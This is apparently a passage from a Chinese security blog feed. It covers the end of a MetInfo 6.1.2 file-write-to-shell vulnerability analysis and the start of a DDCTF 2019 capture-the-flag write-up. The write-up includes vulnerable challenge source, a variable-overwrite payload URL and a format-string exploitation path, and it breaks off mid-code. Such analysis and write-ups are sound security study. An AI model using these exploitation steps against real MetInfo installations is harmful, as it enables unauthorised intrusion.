$_M;</span><br><span class="line">$back = <span class="keyword">$this</span>-&gt;upfile-&gt;upload($formname);</span><br><span class="line"><span class="keyword">return</span> $back;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>$_FILES</code>上传文件属性传给<code>$filear</code>数组保存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($form = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="keyword">if</span>($form)&#123;</span><br><span class="line"><span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line"><span class="keyword">if</span>($form == $key)&#123;</span><br><span class="line">$filear = $_FILES[$key];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$filear)&#123;</span><br><span class="line"><span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $val)&#123;</span><br><span class="line">$filear = $_FILES[$key];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对<code>$filear</code>进行处理后缀名处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;getext($filear[<span class="string">"name"</span>]); <span class="comment">//获取允许的后缀</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($filename == <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$ext = explode(<span class="string">"."</span>, $filename);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ext = $ext[count($ext)<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名如果无<code>.</code>，则取上传文件名即为拓展名的值，下面检查拓展名的时候就可能会出错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件后缀是否为合法后缀</span></span><br><span class="line"><span class="keyword">if</span> ($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]) &#123;</span><br><span class="line"><span class="keyword">if</span>($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>] != <span class="string">""</span> &amp;&amp; !in_array(strtolower(<span class="keyword">$this</span>-&gt;ext)explode(<span class="string">'|'</span>,strtolower($_M[<span class="string">'config'</span>][<span class="string">'met_file_format'</span>]))) &amp;&amp; $filear)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(<span class="keyword">$this</span>-&gt;ext.<span class="string">" &#123;$_M['word']['upfileTip3']&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据库中的拓展名白名单如下</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc9a35161e10.png" alt></p><p>上面代码能看出，如果后缀检查有错误，会调用error函数处理，而且传入参数为<strong>拓展名的值+错误信息</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">error</span><span class="params">($error)</span></span>&#123;</span><br><span class="line">$back[<span class="string">'error'</span>] = <span class="number">1</span>;</span><br><span class="line">$back[<span class="string">'errorcode'</span>] = $error;</span><br><span class="line"><span class="keyword">return</span> $back;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且 拓展名的值+错误信息 被赋值给了 back，最终在 doupfile 函数中被输出，web 类析构函数将输出缓冲写入文件</p><p>文件内容如下 </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc9a7af84a5e.png" alt></p><p>由于文件名与内容可控，注册账号上传图片，然后抓包修改为doupfile方法，根据最开始web.class.php中 file_put_contents 的条件，传入 metinfonow=pjovehc和html_filename文件名，就可以直接写入到web根目录</p><p> <img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc99c2e2c61b.png" alt></p><p> 成功 GetShell</p><p> <img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc861ceee60a.png" alt></p><p>Reference:</p><p><a href="https://nosec.org/home/detail/2324.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2324.html</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46687&amp;highlight=metinfo" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=46687&amp;highlight=metinfo</a><br><a href="https://mochazz.github.io/2018/11/09/Metinfo6.0.0-6.1.2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E7%BA%BF/" target="_blank" rel="noopener">https://mochazz.github.io/2018/11/09/Metinfo6.0.0-6.1.2%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E7%BA%BF/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://j0k3r.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF 2019 WriteUp</title>
    <link href="http://j0k3r.top/2019/04/22/ddctf2019/"/>
    <id>http://j0k3r.top/2019/04/22/ddctf2019/</id>
    <published>2019-04-21T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:52.396Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="滴～"><a href="#滴～" class="headerlink" title="滴～"></a>滴～</h2><p>读 index.php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在给的博客 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80616607" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80616607</a> 中找到 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a></p><p>practice.txt.swp 得到</p><p>f1ag!ddctf.php</p><p>转 hex 加两次 base64 读 f1ag!ddctf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量覆盖</p><p>payload： <code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=</code></p><p>flag</p><p><code>DDCTF{436f6e67726174756c6174696f6e73}</code></p><hr><h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>由 index.js 发现 auth() 函数中的 ajax 请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>burpsuite 抓包带 didictf_username header 头请求 app/Auth.php</p><p>测试当 didictf_username 为 admin 时返回 success 的 json 数据，得到 app/fL2XID2i0Cdh.php</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"errMsg"</span>:<span class="string">"success"</span>,<span class="attr">"data"</span>:<span class="string">"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"</span>&#125;</span><br></pre></td></tr></table></figure><p>访问能得到 app/Application.php 和 app/Session.php 源码</p><p>app/Application.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>app/Session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure><p>查看源码后得知具体流程为</p><p>利用 Session.php 的 sprintf 格式化字符串漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 